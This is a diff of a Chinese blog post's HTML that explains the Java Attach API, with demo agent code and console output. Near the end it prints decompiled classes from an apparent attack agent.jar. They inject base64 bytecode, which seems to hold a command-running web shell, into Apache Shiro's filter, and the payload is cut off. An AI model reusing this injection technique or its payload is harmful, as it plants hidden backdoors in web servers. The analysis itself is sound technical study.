-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">ManagementFactory</span><span class="o">.</span><span class="na">getRuntimeMXBean</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="s">&#34;managed bean name: %s\n&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10000</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">            <span class="n">CompletableFuture</span><span class="o">.</span><span class="na">runAsync</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Woof Woof&#34;</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">        <span class="o">}</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DogMain</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">ManagementFactory</span><span class="o">.</span><span class="na">getRuntimeMXBean</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="s">&#34;managed bean name: %s\n&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">10000</span><span class="o">);</span>
+            <span class="n">CompletableFuture</span><span class="o">.</span><span class="na">runAsync</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Woof Woof&#34;</span><span class="o">));</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>这个程序跑起来后 20 秒内输出：</p>
 <div class="highlight"><div class="chroma">
@@ -699,9 +699,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">managed bean name: 5424@borvino
-</span></span><span class="line"><span class="cl">Woof Woof
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">managed bean name: 5424@borvino
+Woof Woof
+</code></pre></td></tr></table>
 </div>
 </div><p>注意 managed bean name 的值为 5424@borvino，当中的 5424 就是这个进程的 PID。</p>
 <p>方便起见，编写简易的 agent 类：</p>
@@ -721,19 +721,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">OwnerAgent</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;agentmain agentArgs: &#34;</span> <span class="o">+</span> <span class="n">agentArgs</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;agentmain inst: &#34;</span> <span class="o">+</span> <span class="n">inst</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;premain agentArgs: &#34;</span> <span class="o">+</span> <span class="n">agentArgs</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;premain inst: &#34;</span> <span class="o">+</span> <span class="n">inst</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">OwnerAgent</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;agentmain agentArgs: &#34;</span> <span class="o">+</span> <span class="n">agentArgs</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;agentmain inst: &#34;</span> <span class="o">+</span> <span class="n">inst</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;premain agentArgs: &#34;</span> <span class="o">+</span> <span class="n">agentArgs</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;premain inst: &#34;</span> <span class="o">+</span> <span class="n">inst</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>回想前文所说的获取 <code>Instrumentation</code> 实例的两种方式，当把 Java agent 附加到 JVM 时，<code>Instrumentation</code> 实例将传递到 agent 类的 <code>agentmain</code> 方法，也是就说 <code>agentmain</code> 将会被调用。</p>
 <p>不忘编写 MANIFEST.MF 文件：</p>
@@ -746,12 +746,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Manifest-Version: 1.0
-</span></span><span class="line"><span class="cl">Premain-Class: io.h2cone.attach.agent.OwnerAgent
-</span></span><span class="line"><span class="cl">Agent-Class: io.h2cone.attach.agent.OwnerAgent
-</span></span><span class="line"><span class="cl">Can-Redefine-Classes: true
-</span></span><span class="line"><span class="cl">Can-Retransform-Classes: true
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Manifest-Version: 1.0
+Premain-Class: io.h2cone.attach.agent.OwnerAgent
+Agent-Class: io.h2cone.attach.agent.OwnerAgent
+Can-Redefine-Classes: true
+Can-Retransform-Classes: true
+</code></pre></td></tr></table>
 </div>
 </div><p>既声明 <code>Agent-Class</code> 也声明 <code>Premain-Class</code>，OwnerAgent 类同时满足两种方式所要求的方法签名。</p>
 <p>与上文相似，打包好 agent.jar 后，方便起见，直接用 IDE 启动 DogMain，从控制台读取目标 JVM 的 PID，万事俱备，首先依附到 JVM，然后动态加载 agent 到 JVM，最后分离：</p>
@@ -769,17 +769,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Test</span>
-</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">attach</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span><span class="o">,</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">pid</span> <span class="o">=</span> <span class="s">&#34;pid&#34;</span><span class="o">;</span>                             <span class="c1">// 目标 JVM 的 PID
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VirtualMachine</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">pid</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">agentJarPath</span> <span class="o">=</span> <span class="s">&#34;path to agent.jar&#34;</span><span class="o">;</span>      <span class="c1">// agent.jar 文件的路径
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">String</span> <span class="n">options</span> <span class="o">=</span> <span class="s">&#34;Hello, Dog&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="n">agentJarPath</span><span class="o">,</span> <span class="n">options</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nd">@Test</span>
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">attach</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span><span class="o">,</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="n">pid</span> <span class="o">=</span> <span class="s">&#34;pid&#34;</span><span class="o">;</span>                             <span class="c1">// 目标 JVM 的 PID
+</span><span class="c1"></span>    <span class="n">VirtualMachine</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">pid</span><span class="o">);</span>
+
+    <span class="n">String</span> <span class="n">agentJarPath</span> <span class="o">=</span> <span class="s">&#34;path to agent.jar&#34;</span><span class="o">;</span>      <span class="c1">// agent.jar 文件的路径
+</span><span class="c1"></span>    <span class="n">String</span> <span class="n">options</span> <span class="o">=</span> <span class="s">&#34;Hello, Dog&#34;</span><span class="o">;</span>
+    <span class="n">vm</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="n">agentJarPath</span><span class="o">,</span> <span class="n">options</span><span class="o">);</span>
+    <span class="n">vm</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>试验结果：</p>
 <div class="highlight"><div class="chroma">
@@ -792,13 +792,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">managed bean name: 5424@borvino
-</span></span><span class="line"><span class="cl">Woof Woof
-</span></span><span class="line"><span class="cl">agentmain agentArgs: Hello, Dog
-</span></span><span class="line"><span class="cl">agentmain inst: sun.instrument.InstrumentationImpl@4c4744d8
-</span></span><span class="line"><span class="cl">Woof Woof
-</span></span><span class="line"><span class="cl">Woof Woof
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">managed bean name: 5424@borvino
+Woof Woof
+agentmain agentArgs: Hello, Dog
+agentmain inst: sun.instrument.InstrumentationImpl@4c4744d8
+Woof Woof
+Woof Woof
+</code></pre></td></tr></table>
 </div>
 </div><p>OwnerAgent 类的 <code>agentmain</code> 方法被调用，DogMain 的 <code>main</code> 方法也正常执行。</p>
 <p>完整代码已发布，请参考 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/attach-agent"  target="_blank" rel="noopener"
@@ -824,21 +824,21 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">paramArrayOfString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">attach</span><span class="o">(</span><span class="n">paramArrayOfString</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">attach</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">str1</span> <span class="o">=</span> <span class="n">paramString</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">str2</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;agent.jar&#34;</span><span class="o">)).</span><span class="na">getAbsolutePath</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;attaching....pid=&#34;</span> <span class="o">+</span> <span class="n">str1</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">VirtualMachine</span> <span class="n">virtualMachine</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">str1</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">virtualMachine</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="n">str2</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">virtualMachine</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">paramArrayOfString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span> <span class="o">{</span>
+    <span class="n">attach</span><span class="o">(</span><span class="n">paramArrayOfString</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+  <span class="o">}</span>
+  
+  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">attach</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="n">str1</span> <span class="o">=</span> <span class="n">paramString</span><span class="o">;</span>
+    <span class="n">String</span> <span class="n">str2</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;agent.jar&#34;</span><span class="o">)).</span><span class="na">getAbsolutePath</span><span class="o">();</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;attaching....pid=&#34;</span> <span class="o">+</span> <span class="n">str1</span><span class="o">);</span>
+    <span class="n">VirtualMachine</span> <span class="n">virtualMachine</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">str1</span><span class="o">);</span>
+    <span class="n">virtualMachine</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="n">str2</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+    <span class="n">virtualMachine</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>agent.jar/HotSwapAgent.class：</p>
 <div class="highlight"><div class="chroma">
@@ -866,28 +866,28 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HotSwapAgent</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">paramInstrumentation</span><span class="o">)</span> <span class="o">{}</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">paramInstrumentation</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">Class</span><span class="o">[]</span> <span class="n">arrayOfClass</span> <span class="o">=</span> <span class="n">paramInstrumentation</span><span class="o">.</span><span class="na">getAllLoadedClasses</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">:</span> <span class="n">arrayOfClass</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;org.apache.shiro.web.servlet.AbstractShiroFilter&#34;</span><span class="o">))</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">          <span class="kt">byte</span><span class="o">[]</span> <span class="n">arrayOfByte</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">()).</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="s">&#34;yv66vgAAADIBbQoAYgCvCQBgALAJAGAAsQkAYACyCgBgALMKAGAAtAoAYAC1CgBgALYKAGAAtwoAuAC5CABuCgBgALoKALsAvAoAuwC9CgBgAL4JAGAAvwgAwAsAwQDCCgBgAMMKAGAAxAcAxQoAFQCvCwDGAMcHAMgKAGAAyQoAYADKCgAYAMsHAMwKAGAAzQcAzgoAHgDPBwDQCgBgANEHANMKACIA1QoAIgDWCgC4ANcLANgA2QsA2gDbBwDcCADdCwDBAN4JAN8A4AoA4QDiCADjCwAcAOQIAOUKAN8A5goANADnCADoCgA0AOkHAOoIAOsIAOwIAO0IAO4HAO8KADkA8AoAOQDxCgA5APIKAPMA9AcA9QoAPgCvCgD2APcKAD4A+AoAPgD5BwD6CwAgAPsKAEMA/AoAPgD9CgA0AP4KAEMA/woAQwD5CgBDAQAKAGABAQoAYAECCgBgAQMHAQQKAE4BBQsA2AEGBwEHCgBRAQgHAQkHAQoIAQsKAFMBDAoAYAENCAEOCwDBAQ8LARABEQgBEgsAwQETCAEUCgBgARULARYBFwcBGAoBGQEaBwEbAQAAAQAMSW5uZXJDbGFzc2VzAQADbG9nAQASTG9yZy9zbGY0ai9Mb2dnZXI7AQAWU1RBVElDX0lOSVRfUEFSQU1fTkFNRQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAA9zZWN1cml0eU1hbmFnZXIBAC1Mb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjsBABNmaWx0ZXJDaGFpblJlc29sdmVyAQA1TG9yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcjsBABxzdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJnZXRTZWN1cml0eU1hbmFnZXIBAC8oKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9tZ3QvV2ViU2VjdXJpdHlNYW5hZ2VyOwEAEnNldFNlY3VyaXR5TWFuYWdlcgEAMChMb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjspVgEAFmdldEZpbHRlckNoYWluUmVzb2x2ZXIBADcoKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9maWx0ZXIvbWd0L0ZpbHRlckNoYWluUmVzb2x2ZXI7AQAWc2V0RmlsdGVyQ2hhaW5SZXNvbHZlcgEAOChMb3JnL2FwYWNoZS9zaGlyby93ZWIvZmlsdGVyL21ndC9GaWx0ZXJDaGFpblJlc29sdmVyOylWAQAeaXNTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQADKClaAQAfc2V0U3RhdGljU2VjdXJpdHlNYW5hZ2VyRW5hYmxlZAEABChaKVYBABFvbkZpbHRlckNvbmZpZ1NldAEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zBwEcAQAnYXBwbHlTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkQ29uZmlnBwDqAQAEaW5pdAEAFWVuc3VyZVNlY3VyaXR5TWFuYWdlcgcBHQEAHGNyZWF0ZURlZmF1bHRTZWN1cml0eU1hbmFnZXIBAA5pc0h0dHBTZXNzaW9ucwEAEndyYXBTZXJ2bGV0UmVxdWVzdAEARyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAVcHJlcGFyZVNlcnZsZXRSZXF1ZXN0AQB4KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7BwEeAQATd3JhcFNlcnZsZXRSZXNwb25zZQEAfyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvU2hpcm9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABZwcmVwYXJlU2VydmxldFJlc3BvbnNlAQB5KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwcBHwEADWNyZWF0ZVN1YmplY3QBAGgoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEAG3VwZGF0ZVNlc3Npb25MYXN0QWNjZXNzVGltZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHARgHASAHASEHANwBABBkb0ZpbHRlckludGVybmFsAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgcBIgcAzAcA0AcBIwcA7wcBJAcA9QcBJQcBBwEAEWdldEV4ZWN1dGlvbkNoYWluAQB1KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEmAQAMZXhlY3V0ZUNoYWluAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAYQWJzdHJhY3RTaGlyb0ZpbHRlci5qYXZhDABwAHEMAG4AbwwAagBrDABsAG0MAIQAcQwAhgBxDACHAHEMAHwAfQwAdAB1BwEnDAB2ASgMASkBKgcBKwwBLAEtDAEuAH0MAH4AfwwAZQBmAQAxTm8gU2VjdXJpdHlNYW5hZ2VyIGNvbmZpZ3VyZWQuICBDcmVhdGluZyBkZWZhdWx0LgcBLwwBMAExDACJAHUMAHYAdwEAMm9yZy9hcGFjaGUvc2hpcm8vd2ViL21ndC9EZWZhdWx0V2ViU2VjdXJpdHlNYW5hZ2VyBwEdDAEyAH0BADRvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEzATQMAIoAfQwAcAE1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAiwCMAQA1b3JnL2FwYWNoZS9zaGlyby93ZWIvc2VydmxldC9TaGlyb0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHABNgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDACQAJEHATcBAC9vcmcvYXBhY2hlL3NoaXJvL3dlYi9zdWJqZWN0L1dlYlN1YmplY3QkQnVpbGRlcgEAB0J1aWxkZXIMAHABOAwBOQE6DAE7ATwHASAMAT0BPgcBIQwBPwBxAQATamF2YS9sYW5nL1Rocm93YWJsZQEAinNlc3Npb24udG91Y2goKSBtZXRob2QgaW52b2NhdGlvbiBoYXMgZmFpbGVkLiAgVW5hYmxlIHRvIHVwZGF0ZXRoZSBjb3JyZXNwb25kaW5nIHNlc3Npb24ncyBsYXN0IGFjY2VzcyB0aW1lIGJhc2VkIG9uIHRoZSBpbmNvbWluZyByZXF1ZXN0LgwBQAFBBwFCDAFDAUQHAUUMAUYAfwEAA0NNRAwBRwEqAQAHb3MubmFtZQwBSAEqDAFJAUoBAAd3aW5kb3dzDAFL